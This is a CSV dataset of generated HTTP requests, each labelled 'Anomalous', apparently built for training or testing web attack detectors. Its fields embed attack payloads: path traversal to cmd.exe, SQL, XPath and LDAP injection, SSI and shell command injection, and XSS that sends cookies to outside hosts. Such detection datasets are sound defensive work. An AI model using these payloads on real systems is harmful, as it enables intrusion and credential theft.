Class,Method,URI,Host-Header,Host,Connection,Accept,Accept-Charset,Accept-Language,Cache-control,Cookie,Pragma,User-Agent,Content-Length,Content-Type,POST-Data,GET-Query
Anomalous,GET,/scripts/file.bat/..,HTTP/1.0,www.ie6a.de,u4oe,"audio/basic, text/*","iso-2022-jp, x-mac-arabic;q=0.8, x-mac-arabic, cp-950","a-t, tme-usdigt, tkdgjkxo-Hd1",no-store,hssccsHahhsm=Eaae/ot'iE ;eoe=509;zr=@E;75k6CunionGiiKV1=53,dpags=th2dia,Mozilla/3.6 (Machintosh; U; PPC 0.8; t5-4h; rv:3.7.7) Gecko/75820373,,,,
Anomalous,GET,/QvwhX5y0R/Tu/HEDir2mvarVtk2Co_/iixe5trepU6auA3yn/tTQO1/ampMt4nm1aidnmaeeth/qiIiepj/thlda5eh/elgsHqek.jpeg,HTTP/1.0,www.ortdN4.uk,lftel,*/*,*;q=0.0,"c1wk-smtErbe, bk-IitfpI;q=0.9, co00rtU-iti34rEa;q=0.0, ec7dhMr-twsyb;q=0.2, s-a",yR7es=tti2lc,FPny0--Mv9zE=hgi,stseT='3V',Mozilla/3.8 (compatible; deeRo; Unix; baoer; spbeIs; hi2ipOaCte),,,,anqo=%3C%21--%23odbc+statement+++%3D++%22select++vo%2C+5e%2C+++++o0wdias+++++from++++lrrasMr2co+++order++++by+++2%2C+++++470%2C+++++8%22+++--%3E&dqehqdyrO2t=%3F%24fiiabeinserteieiororwinnt+n&dobexntaidcamsr=ry5&7rntsiot=546015&HN04sAps-=evl&cn=enetcat0%26oetallv8u8em&sose=1985623456
Anomalous,GET,/yCh2-CJGtWc.9/i7gLdatOnzta5/usIYobKKsSLwg8Wo/enc7fU-1divaE53/nsc.dll,HTTP/1.0,3.182.5.193:37902,keep-alive,"video/*, text/*;q=0.5, audio/*","shift_jis;q=0.8, iso-8859-6;q=0.6, x-mac-cyrillic, x-mac-korean;q=0.0, shift_jis",*;q=0.0,no-cache,6noamn=s,nnUinih1=J6r1ota,Mozilla/2.2 (Machintosh; U; Mac OS X 7.7; 3o-rn; rv:2.8.5) Gecko/21131740,,,,Onou=n%2Flnn%2FpEsi%2Fchild%3A%3Anode%28%29%5B+position%28%29%3D897%5D+++++%7C+Oriaic%2Ft%2FerALa%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D1%5D++++or++++%27qaa%27+++%3D++%27&nirorlwtksn=2546217
Anomalous,GET,/WadietAidjpd/asNWKH4HcZoEURWw-/x9WuV.cfm,HTTP/1.0,55.54.249.194,keep-alive,text/html;q=0.7,*;q=0.6,*;q=0.6,only-if-cached,UimOtoYnIe=n1;Esct=98722;fpeioidrtTrrh=ce6cvarnywget;Ieawindow.open=shutdown+9rt,igf8ip=6mthTY,cw9adie/5.1.5.9,,,,tso3eocngcNeadh=%290ddwtelta&sh=rU0&weewtAui=sULfU&yneeVnudataga=97548&6hqog=..%2F..%2F..%2Fusr%2Fdsqqdsqsd.xml&ehho6sEibiFpa=9837667&em=q%28shainsert%3Cnstyy&Malhvvosh=35&3WRgX7Y=4847&eEh=34&ee=%7Eretw5e+Ubs%3Fa7i&qhqhl8g=xp_%3Bnullacatcnkyrwp-systemL
Anomalous,POST,/Jv8lET5telnet2rT/Csdqit5ksIsaratIotM/s45Z1FNz9eRw/eDeifuy/t1qRCm88wZi.z0/a7MUlikeeW-Ghtpasso/awee1sr/tUoKkTcBue/kryLAtaEk5.msf,HTTP/1.0,116.58.101.190,keep-alive,*/*,*,nheh-oa,no-cache,saai=4b+;Spscmd1lhboot.inid=<img  src   ='   tinine 'onmouseover=   ' [document.location.replace ('http://www.tori.com/cgi-bin/llinte.cgi'+document.cookie);]    '   >,no-cache,Mozilla/0.2 (X11; U; Linux i586 4.8; js-Nz; rv:8.3.7) Gecko/62589511,243,application/x-www-form-urlencoded,opc7r=i_Ap8giG7&2tshavingSlUsmI=a3libi&yBSEt0oere0hE=Odo&7lttomte=eriytrk7oTihw&eAtzdzrun=5N |xrpaIoR'\\o&o0ihr=Rcw&anemd0aii=heTo&iEu=nsleSs&l-ZCYechildZi=w0e&3olfn=9&RBfERP=504&tptEyaycmeot6cy==[rlog&hnbyhtzdt=%&eufalrui=wc&ts=fau,
Anomalous,POST,/pHMAbRWjGmJBZmRlh1/a@K6kxDUHKdGKi1GC/gwhh13floSae3imhea/hkehT9a/m0hBOP..shtml,HTTP/1.0,www.tirItzrab.fr,keep-alive,"text/*, application/*","x-mac-japanese;q=0.8, windows-1254;q=0.5, iso-8859-8-i, windows-1250;q=0.2, shift_jis;q=0.0","aoaq-hcne;q=0.7, e-n0;q=0.7, Tomis3c-Hn;q=0.6, miVe6Y-TvtsruAa;q=0.1, f7sasr6-he",max-stale=3,ipe9Jm3=112815;NZn=pmeiss;Aeernepfae=tdsbajv2Dd,a=rwagdaok,9nC7/5.7.7,252,application/x-www-form-urlencoded,"pepntwciuxi89p=9987&ssgeA3oobnlt=ol'o&ze=256607&aweas8iaatot=<!--  #odbc  statement    = 'select  ttu,   urt6T,  plltj   from  sygion1wtp   order    by     3,   84, 9'    -->&3NndRp=7)aimse<m@]4ia9H&emi1NtelEwenee8=aqNOu",
Anomalous,GET,/hiA.jsp,HTTP/1.1,40.51.55.224,keep-alive,audio/x-wav;q=0.5,x-mac-arabic,"eu-1ehlVp73;q=0.2, hl-aIisgjie;q=0.3, 3t5tr-btmll7, 4aN-s7heh;q=0.4",min-fresh=0647,O2Kbodylwinnt-J5SA=2affa;l1ano=781;rn9undree0=0970613;Es=urmxstIecxNew;esret9=he=/;6a=nhn,no-cache,Mozilla/0.3 (compatible; tewnbrEu; Solaris; sha3txenb),,,,bloj0ocfc6lscTq=402&zGGyGxh=%5C%3B+++++%5C%2Fbin%5C%2Fid+++%3B&nehsdnsu=eter&tbeenTHMTtsz=c2eumoedB&aeeeacscncaatI=infasr
Anomalous,GET,/loYlSr/agmPz7C@mBgynxK.D_h/57n6iiok/iokaad/nofpgk/abrjOl3ph.cfm,HTTP/1.0,www.7zp5mw.it:80,aI8i,text/xml;q=0.1,windows-1257,"bhriaNz-a5g;q=0.4, tte1tts-eitDt;q=0.4, vsr0gh-oelyt, fr-s1oLt",no-store,rreinetycnn=07030638;uTctb86te0e=i)W)anSloA'sr~r;zfVZYbN=iMmtrldt0tiiao;brAKv8=elnns' or  (i <   count(rkiwn/child::text())   and  j <   count(mae/child::comment())    and    k     <    count(eh/child::*)    )   or     'Bvv'  =    '     e4'  or;vHmailQwp-8_=t,no-cache,Mozilla/8.1 (X11; U; Linux i386 5.6; hn-id; rv:5.8.9) Gecko/35395109,,,,aEpymE2etof=rp%7Ce%40%5Dte%3D%29afH%3Bs&evsLsa9wogHgbt=517711
Anomalous,PUT,/eJV24Wjn0/R2wXwANNo5I/ellmaocu/rarkbB5jJH.eQ/nE4Bem9IP0/dWHUs77lQtGT_yy/mes3it7/n18/szjQz-jGWneSz@/4hDTowN.swf,HTTP/1.0,93.15.138.77,vhL,application/*,*,etEe4o-nna,min-fresh=854,oo=ohe6letixnouhi;iA7heemSe5Oa7e3=45;JED1@Pdelete=pAaodaezwinfrometw;f0xZt-W9kL=otinTm6eh3c8;rNhkoe=U<s,no-cache,NieurtptTg/2.1.5.7,262,application/x-www-form-urlencoded,"dn='  )   UNION   ALL  SELECT 'mRfalabb',6,29,'ioIisrn',07  FROM     ldet9eaila    WHERE (    '' = '&qnnE=ft&0an=iic6-n3iDmUp&sataltspTlb=ikEscriptlsugo&feiue12ttlgtee5=6315&iion=yUhI3L&bnX=ede4sfh&LGh.4J1Q=tm@Cjis&sh5x0ratfot6=fo",
Anomalous,GET,/y4aTrjen5hfNitkr/swwu4trquOutaNs/SPTk/e4ix/YCYNWfSBJ5WwNDlike/ee/4dvsMra0nqw5meegnv/pp0.css,HTTP/1.1,39.47.74.132:80,Ated7qa,"text/plain, video/quicktime;q=0.9","iso-2022-kr;q=0.6, iso-8859-4",*,min-fresh=13,ahnbOaTOtFvua=taasq,wi3hki='Rd3e9als',Mozilla/7.6 (X11; U; SunOS sun4u 2.7; mt-cp; rv:7.5.3) Gecko/75114027,,,,sgtnz=522&shooljmfe27t=6542988172&bnnku=%3Cimg++dynsrc+++%3D++%22+javascript%3A%5Balert+%28%27go%27%29%3B%5D+++++%22++%3E&52PcdmtqThi=352988&g4ont7oiuEst9r=aa
Anomalous,GET,/lmIteb/sY-qgHa0_o/LXnvFAYPc0@7S2/oncundatXml7soeSSe/ev@ghR7H/rea/b0xefmkO7/oIAM63/4lhomjtm2uslgyra/tVY@6PNCDg/uy2hGqj9l.jpg,HTTP/1.0,213.14.211.177,AtthOoo,"text/xml, text/plain;q=0.6, application/x-tar",*,*;q=0.0,no-transform,EmJ8Jewp-t=Cnulltohe>+t a0w);pitsygbeeo4t2=fsaiaal;ealet=4779;csrsthelsilaz=663,no-cache,Mozilla/7.3 (X11; U; Open BSD i586 4.6; oc-aR; rv:4.6.8) Gecko/21572786,,,,jhhfps1ls=%29+%28+%7C+%28tab%3Dtn*%29&utd3=laaenbst8&1wCESlhaving=si8iCinsert
Anomalous,GET,/qZa/loilodtEIusdbeOejhnr/dUolk@cX9VpUKP/3pbj2vX2/aCEG-XTHU9NdeY0R--Y/RnSp/icEnnnineirnmstaeD/mjpLrO7CsWj7ERxe4Ood/rdYy8choDvhfgkSahmc/ndqn.png,HTTP/1.0,www.roorhf.uk:80,keep-alive,*/*;q=0.9,iso-8859-9;q=0.9,*,max-stale=34,rpLQEexecbcr=2890;Ifnnfonl=77903127;seitemxrrTimat=:gandue,no-cache,Mozilla/6.3 (X11; U; Solaris 9.9; ir-qt; rv:7.5.3) Gecko/48634893,,,,OavMnD=%3Cimg++++dynsrc+++%3D++++%22++javascript%3A+++%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.as.com%2Fcgi-bin%2Fneto.cgi%27%2Bdocument.cookie%29%3B%5D+++%22%3E&s9iaLno8=320&aAncnd7lhseeoae=etcchue5is1jr&mtemLwniadat7=htpass++4mvarfiercte
Anomalous,GET,/vengEehisdsx/s5/vORoPoorVN/0e/2rtnwhnccichbjSyaweu.jpg,HTTP/1.1,www.rouoo.com,close,*/*;q=0.0,*,"jehtcepT-honr;q=0.7, Oceau-ras, p-o6aoexrh, bsoA3la-nn;q=0.2, mVecN6u-aane;q=0.5",min-fresh=5108,oslis4er6=elsmailu>Am;ymiol2IhiEei=42;lqOrnuhyln=na;hRwget6t1pAmy=m6OLziFNB;hh2ektuvn4otp0o=@eMEhtoppmo0,egtel='awitr',Mozilla/1.9 (Machintosh; U; PPC Mac OS X 2.5; eJ-sj; rv:6.7.5) Gecko/18928508,,,,N7LiMtQcrbetweenK=%25xw3&on6bldue=316485119&eDegHovleaan=oaeT%24%5Ddtn1&4WmFWe3xg=56&o2ft0iseg=sahws%2Fpn&cim=uid+C&ifHstenoqmtoEs7=E8ht&bodyYiframeDPa.Nx7=FVeyu%27++++or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++or++%27onehX%27++++%3D++++%27&nUisHrajsl=odal
Anomalous,GET,/..%u00255c..%u00255cwinnt/system32/cmd.exe,HTTP/1.0,136.228.146.94,close,*/*;q=0.0,*,*,no-store,coit4elcsbneac=228;c0uwe2e=5596737,NuD='0dtugo9',Mozilla/6.0 (Machintosh; U; Mac OS X 8.4; s9-ed; rv:7.8.7) Gecko/42583413,,,,/c+dir
Anomalous,GET,/lsrecajtl/2DvA7cCr2XCtnW5ujIm/1E@OSr2DXe03X/wBht5@9myPtKXsUp4.jpg,HTTP/1.0,101.187.154.203:02331,close,"text/*, text/*, text/*",iso-8859-4;q=0.7,*,no-cache,cByY=9;etpFenqaPadn=Ke2tlDHi;lhog=3509968;ane6yua=t08wQ,02Twseeu='b7e',idt0orh/1.9.6,,,,SRUQ6W.mG=zutzpsa+ctu&bv56hd0=acnOhaImtk&sfHvor=78&E7htacces-=%3Cm%40&y5a=t%5Dael&.fgl=caeh&me9kteokmoRt=nyeuh&ae=fanyHqzl&ureMcso=pthsVx&f2Dp56uXdiv=s5LkCezxzr2&me08t1Es00=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fentomaniar%2For%2Fllsitier%2Fndng.jsp&tj6Ul=oxmf%40&fyb0t=rodd%28Rihavingyn%40w&leAsmtlii=rjdr&ptgzwqpPm=uLoodnph-yc%24i%24aeost
Anomalous,GET,/oiCs34K6gMLePQ-CNa/iFi9/hf2nKeAC.cfm,HTTP/1.0,178.82.184.125,keep-alive,*/*;q=0.2,"utf-8;q=0.6, x-mac-arabic;q=0.4, iso-8859-8-i;q=0.3, windows-874",fal-edyctt,no-cache,csTJees=ms nandfT$passwdoet rIhE;Ee0hoe=h0UiFFJ1;ia5tl=oA1vcTLjQ6Vr,eih='6uK',EEeAhglgEdt,,,,uHfcoxdGshtl=hwRia&ea=5&mqbsooe5Turh=%27%29+++++UNION++ALL++SELECT+++++%27epe%27%2C463%2C8512%2C%27xopOtotni%27%2C6++FROM++++tncw++++WHERE++%28++%27%27+++%3D%27&AymC8drop4.=9029768&ttxa9yntitdwnh=8559111651&te=Irbnos&J-EVuKO0B=heh-nemochanacceptperltRkn%28+yHge&lnrr2nA=t&7qlf2OO1f2@=wai2tnqensUusftooa&rrwmr=1iyitetcoan&ltDxzsihatosoE=oj3&seuoidtnr=ow2sjM&UQp-=yTM5Y&rmcutswLdEaber=914654341&estonge=ttfl
Anomalous,GET,/ebIkGK5NQut-q/hrhngT20dimilcby/mGMdOXFSighER.aspx,HTTP/1.1,98.254.253.159,close,application/rtf;q=0.4,"iso-8859-2, x-mac-roman;q=0.6, iso-10646-ucs-2",*;q=0.0,no-transform,EmJ8Jewp-t=Cnulltohe>+t a0w);pitsygbeeo4t2=fsaiaal;ealet=4779;csrsthelsilaz=663,no-cache,Mozilla/2.6 (X11; U; Solaris 0.8; et-we; rv:8.3.6) Gecko/02078801,,,,nsi=ee%3Baiusrl5+&iienTaa=htfzrte&eithbit4=68580488&iir93rrRt4h0rh=21645411&sAhSvnao=w+q4snatteeoA&tmpH71z=04&pte.X3MUlikeCU6=2zidksy&mhiTf=1918%29%28%26%28objectClass%3Dpsr%29%28%7C%28sn++++%3D++++nwls%29%28cn%3Dst++J*%29%29&owret5ht=0dekv
Anomalous,POST,/.UmKwallsHnW/eNW7window.openinsertboot.iniv/fetzTau3yeA7adiWnnh/P2wcFsystem9/owRLfKWcqta0qLLwbanG/cchilddJkT0netcatJEA/nn1snie0obU8/ygennqosAevt1olpee/tF5viccmtnrkh.mdb,HTTP/1.0,www.tssevf9u.fr,close,"application/*;q=0.6, application/*;q=0.5",*;q=0.1,,,,,itwtfvtt/0.1,92,application/x-www-form-urlencoded,zily8Seeouozhnn=w?n3prmeetr1\\r&oonqjnd=Ottue&yUing=aaGs&lseLnH=138764078&tsArc1t=4293,
Anomalous,GET,/AVwBhttpsBFy68P/emxocaaEI9httamee.php,HTTP/1.0,109.203.41.58:80,a6ae,audio/basic,"iso-10646-ucs-2, x-mac-arabic;q=0.4",*;q=0.4,5xkrlhu=2duanE,9xteIw=846177751;ieafesz8ye=u3uhome7%iHtodocumentL[oj3ms;acezehu=ciAgw@,lwr='lh',Mozilla/5.2 (X11; U; Solaris 5.2; 2o-cb; rv:8.8.4) Gecko/45936875,,,,eolubhi7=axcicjPyo-Qg&QKhsjBT=Ee-0jts%3AtIns5rehim&8cHnvowinhte4t=9131&pt7ug=xhiev%27+or++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i++%2B++++j%2B++++k%2B++l+++%2B1%29%5D++%7C+++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++or+%27vswe%27++%3D++%27+++++bo%27+++or&86bktT4-2=adivnLDd&rhIw=oi%3F
Anomalous,PUT,/hWJJ0Btq/RfvY/np/OM3shutdownQ1Krq1-/i1Yfp0_COqyTiQL/oQHWbavR0.html,HTTP/1.1,162.50.66.118:47788,close,"application/zip;q=0.0, audio/*;q=0.7",iso-8859-5,*,no-cache,unionmochaIdMJU0position=+ipsoew>0t2ecAr;ebrofte25atv=9OaI,no-cache,maL0rozat,85,application/x-www-form-urlencoded,@GIBkj0execQPtq=hloewqwin9i&7slhTree6XnJ=ian8)(&(objectClass   =   E2ro*),
Anomalous,GET,/ofntocret0or6a/hkphctst1nano/p@Ol/tHuKSvDC/gdsndrtlt4siim5ehs.jpg,HTTP/1.1,www.beskd.com,close,application/*,*,"rptsoa-wh, ad-qwx;q=0.5, ioeiimrp-3aazlen;q=0.9, ie-etf19td;q=0.3, a-bJexTEhf",no-cache,nbliz=dfYP0hgN-H;hmsqgojrs=diR6We.csBiW;loddsVso=ja6;2oe4orSgnmr6eh=08;yH6zmiRukysscm=48047537,no-cache,pmlneedmq (seXe68O8SX; 2Gjm0pWgc; asvNzD_zY),,,,trrma=%27+AND+++++USER_NAME%28%29%3D%27ptmyrK&liddoyupicihk=%5Dialo
Anomalous,GET,/esslwnzoaorad/CTinm4node9VS.whaving8/eab@J9/Veo/ertidNo44cNebkx/ietsotuhfti7s/ra/xyy3dbzseeetmeqMbp/scriptOnMEs_ZZYefrxp_.php4,HTTP/1.1,www.trdnb.cz,dedrKrno,"audio/*, application/zip, text/*",*,"9h3y-ep;q=0.3, SeAnsk-chTauo5;q=0.1, i-h;q=0.8, nte-Nt5;q=0.4",only-if-cached,ANs59=c2I_iThnld;E.Baccess_logrgdawD.=hXA443@1iT;fres5o=t4se,pNdse2w='ntoo',Mozilla/4.9 (X11; U; SunOS sun4u 2.1; f1-is; rv:1.3.0) Gecko/39061821,,,,6PHj=%3Clink+rel%3D++%22stylesheet+++++%22++href+++%3D+%22+javascript%3A++++%5Bwindow.open%28%27http%3A%2F%2F178.43.127.75%2Fns.pl%27%2Bdocument.cookie%29%3B%5D++++++++%22+++%3E&shhliizitbnetth=8856
Anomalous,GET,/eetteqevx8/yQ0S1P2.5/nMBuEC4LeQ6QWmkr@J/iahoes/ehttrCe4cf0Oohlvva/n5/9@p/sRX/sEietpKe.css,HTTP/1.1,www.htlMa.biz,srnlgaE,*/*,*;q=0.6,)    (| (dseae=hln*),max-age=873,0lWcmn=wnn86;B6wZ=eu2t;Gnmrhcmmthc=3123892;vtef=3670075;Llao5n6d=shPzMGVI6W_,no-cache,Esosneu (ajUigfd; kfXYZH; 5w6x122; n.A.Xb0_),,,,
Anomalous,GET,/0rmZ2jopenCUDRTVWWX/vw/sgJz6A/bauyj0oibsi/hV56/lULKVTjhAXeMwxE@/iAhheHtoagnymsarset/CntXt/bf@/nU1r/n.ROl-Kb@qM.png,HTTP/1.1,www.csettS1edl.be,s8d6Na,*/*;q=0.1,"windows-1254;q=0.2, cp-936, euc-cn, x-mac-japanese;q=0.7, windows-1255;q=0.8",*;q=0.1,no-transform,deosoelId=in;laulwoerlseht=2142942;dcelt=2383;ewleAsn9Nls=9008;fckeoh=56250;sst6r=ohin%ryq<,m='plP90',efadU (bruRS.JO; n4hBXnbt; ihWt.Hr; e5_YR1cpP0),,,,izibeeat=..........................WINNTsystem.ini&ialoem=97967691&oiiol=4&sso7A4gzhowptpo=048226&dUnrNnrWtoia=12961&r3hmkhrrm5a=rndkuneaknsivj&A0ah48b=7696605714&oztdRysrncapt=a3z.jXxAKQ&kAxb=wqtflinmweu8qcti&epreehr=312399&xp_K0d_5fhtaccesS=lntoi&w9sitcrceh=cmdqty&rsnmceIEi9eaa=eleqlo
Anomalous,POST,/Uh7/hdLshyWFVoZxE0y/3myW/knn9hbstini5ytZvbr/rbphhxEvztprgnf/f5t/aREZt1PSo6Y/r1gigasa/6Byaccept.isstdinSu/mw5H0I/aGjDg6K1_CbtV2.php3,HTTP/1.0,20.78.204.13:80,close,"image/png;q=0.4, image/jpeg;q=0.5",*;q=0.5,*,no-cache,amtddteuebenu8=/../../../Inetpub/iissamples/mellchll/stroan/taatiserme/gema.sh;n0oesbeii=03;het=gAK6,,Mozilla/6.7 (compatible; eis5rhsnie; Win 9x; eodeg; pnzeesur),14,application/x-www-form-urlencoded,zwon=nUne/Es,
Anomalous,GET,/LunionH9JV.0htpasslincludegroup byV/sXHPQQByXj@YnCn9z/f00rto2Ertsqhe0sh/ssnLstye/wHWE9.xplBIIYJq/raEneaEna1onEe/rPVZv4ni2HDam7g2.swf,HTTP/1.1,65.103.54.204:80,keep-alive,*/*;q=0.7,*;q=0.9,*,no-cache,saedRr2a=076757287;n7tatbycIetninr=9135610851;YOi79YWfkxnull=mpnnaobomochaetgroup bye31,eild=oOcba,mEEiovqt,,,,tl06eona2OToAo=XesSc&egreeh=hwATgwithost&SboOao=6344&ueanlyes9rul=546++or+++1%3C+++Tttu%2Feetn0m%2Fi8ao6t%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D20%5D+or+840%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&4oliar9tth=a%28ut3oeotieev+esock_streamoi
Anomalous,GET,/f7sEKl2l2rShK_@1T/srn6jmitp/pX/tZ/cHJ3aoaHfsPFRWV21/xIeFa5gwP_cVJQJi6Anv/ohjs.gif,HTTP/1.0,26.168.147.107,close,"text/html, audio/basic",*;q=0.9,*,euya='resi',ightNeedzele=k;ntteh2n=794;OEQlQM=n8pelShoreersaeRs;est=h ;4JO2=tQaMot-zsENP;qWa6wwbtlaa=148071,esannB=eoOt9ke,Mozilla/4.1 (Machintosh; U; PPC Mac OS X 0.4; em-wr; rv:7.8.4) Gecko/94863730,,,,ntifntehvhlec4s=%3FNtd%3EaiframeClx9&9brm=%3Ciframe++src+%3D+++%22+vbscript%3A%5Balert++%28%27Groioi%27%29%3B%5D++++%22+%3E&lrn=jttty%28hd9icjb&tlSriiowlcc=lzL&rdritleht=5&totro5cep=190312&PPW@G8V6=1921164615&fXbog=i1position0nttsse&U8at4ajlntse=er%40nj+orN&gtimrlraol6knme=3057&rCops3rtme=422&trc=metft&4eeyd9=ny.d
Anomalous,PUT,/toYGp1wnYoig/izAhp1zaSrssEbs84ah/2rMlndpnel.sh,HTTP/1.1,www.Eaemo3sm.net,keep-alive,"image/gif;q=0.9, video/*;q=0.3, application/zip;q=0.1",*,hsmte)( |(aDuhn=*),oao4NHe=cre5et8a,wiieEeazente=dzx8E8G6i;hirhseaaipttAo=nedgnrrmodxhtebe;9497rNc6sae=n-5MFdM;opst2l=>cglo;LWDdBsvrYfu=nuQ52cL,no-cache,lnIt (oV0QKxS; dyI89-; oim5FTT; e48dLZ6Y5U),223,application/x-www-form-urlencoded,iiiat=sz&qabinme=9&xZSP=51237&iSrec=7hbj3h&oaghdHhi=6&IorvD3_v=84041259&aAtTroddap=qidd&cxlexSef=88369425&sExmtfua=wherehde9HhgEm&7doiikgeh=s6u8d5e&buteE=fMux0niBW2pu&h81dgtaotw=oda aRishrcphEDer&PnttsadIine1ziE=0Nueaoeo4ey,
Anomalous,GET,/eararjt9nwawd/hMdOonXetsXsue2bb/zLRhZoGslbEc/dropYzP3/soa9/BfVNpMtCVuNqP/rLLp@F_bw3Dxqr5A_r.html,HTTP/1.0,www.ae5or.biz,keep-alive,*/*,*,"nubm-0Tst, o-dn, sgri-vlflTq;q=0.9",no-transform,esheeezmo3=5;4SataT=oeh2raensikriolaai,no-cache,bghpV8 http://www.ckenoi.st,,,,0Ef0sz=w%3Cntp%7Ces8&Qene7emcHM=3tg%2B%7Cx+and%3Cynzlynscriptc&eatrbe2eeee0=niDSNst&uak=tEj%29%28%26%28objectClass++++%3D+++if*%29&ttteG5Nc=3&asqs9iwhsueee=ee
Anomalous,GET,/n5MsLkJq7sBvhxCA/k3/rdpx7@Ea9Z/ooeAsuesbh7m/rbLNsN/fCbgvkwV/eV.wwtF.rao.DNRRUq/yyG/3lKQ68@tou3/lygrlpEYR.swf,HTTP/1.0,www.mp8PM.be,close,*/*,"iso-10646-ucs-2;q=0.8, euc-kr, iso-8859-6;q=0.7, x-mac-chinesetrad, us-ascii;q=0.3","ettr-do, 5Ias3og-uau;q=0.1",no-cache,auebhRA4mink=616884075;nezeiontcr0noi=2329257640,no-cache,9tsie4sr (e-iPyG5u),,,,sdaRritoftjnsg=3911829&_b@Rdocumentlcfu1=8520&asqe4=emrs%40P&3hupdateop7lib52=%3C%21--%23echo+var%3D%22date_gmt%22--%3E
Anomalous,GET,/LnFVinputFCOCyL/-21k/f39_HhVG/nVKE6R6fZWMBaOwbgxY/fte/vhhrgks/hjtt.HimUq6SjL/32nE48a18z9TgqL/eHo0FFho_2icf.png,HTTP/1.0,www.lskl7c.org,octTty,"video/quicktime;q=0.1, text/*;q=0.8, application/postscript",*;q=0.5,*;q=0.8,fru=0c,gospa=77696541;oi1rnO6s=pet31lNiuitfnf;7LnS9nodleaaaac=11769846;i6rEevlBvhee=3naperltbodyhconnecthsSnnullestdinelsf;5uwtar=rL2FU-3brCk;2-J6=h6OvoHTcv-07,riC=erS9aa,Mozilla/0.3 (Machintosh; U; PPC 0.0; os-Iw; rv:7.1.7) Gecko/36157045,,,,un@_Uy@=83048578&ahT=918899&thd=836%29%28%26%28objectClass%3DtrkU%29%28%7C%28sn%3Dai%29%28cn%3DhY6H++J*%29%29&stbr=alyj
Anomalous,GET,/8edzDssoteyPtutle/njiOtoonnjsmlerg/ol6gnrieojO.asp,HTTP/1.0,www.qenbmixt.uk,keep-alive,*/*,"koi8;q=0.6, us-ascii, big5",*;q=0.7,min-fresh=4,ubgsoundNt_0qhZ=151;lreecneahtE=n7ld<;u1eag3h=133888;-CDk3=10;hefru=s9crdhEs-tlsunion,es=nEg6ln,os7nesDih8 (tPpaZ4diRn),,,,eeptednTeuet=8dlnd%2Fh%2Fs%2Fchild%3A%3Anode%28%29%5B+++position%28%29%3D4%5D+++++%7C++++6ck%2FIthD%2Fhdiwgi%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D49%5D+++or+++++%27neAiNx%27+++%3D+%27&cwiamamqpenyyi=athg3rwSo
Anomalous,GET,/Ioee.shtml,HTTP/1.1,www.dlgtOint.biz,close,"image/*;q=0.8, video/*, application/rtf;q=0.8","iso-10646-ucs-2, iso-8859-9, windows-1253","9e-Ec;q=0.3, 0yxa-etuKe;q=0.4",no-transform,8pta=ozoerc;eeiei=538850084;shutdownWiwindow.open=fdwis;isKc3SWhTrozr6=etmhs ovS&haa;oniHa=oc;nrhynarsueseil=b6orao9g,no-cache,Mozilla/7.1 (compatible; Konqueror/0.7; Win98; neirbdj; ynlyi9o7ea; ifeilpwad),,,,lonetmeao=lnetcatauenrI&eiaaiv=a&riRd0sueteaeo=5T&Wro=%3Cdiv+++++style+%3D+++%22++++binding%3A++url%28%5Bhttp%3A%2F%2Fwww.manamant.com%2Fscript%2Fess3lEneN.php4%5D%29%3B+%22+++%3E&KsQ1lVEjVaeval=seperlilnfe63qTtdrop%3E&euen=6+oem&nyu6DwyRU=ose&yti=93&q@WEFYAWu8=7488&seooLnf3str2y=08&iosaeiektkgte2=%40slikenelr&2lsbuMeTotiftao=0249758710&nsmR8yteqht=srkrgAbsbzjo&vmRSO70LP=71150740
Anomalous,GET,/fi4/aYT2xIuuL/roVW7C4xxiRjt6__c/O8-metaN.jpg,HTTP/1.1,5.193.126.223:80,nveo4,"audio/basic;q=0.6, image/*;q=0.0, application/*;q=0.1","ks_c_5601-1987, euc-jp;q=0.1",*,only-if-cached,IKuqxsystem=rVtTZO,no-cache,Mozilla/6.4 (Machintosh; U; Mac OS X 8.0; ll-iz; rv:2.3.5) Gecko/28510295,,,,ohc=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29
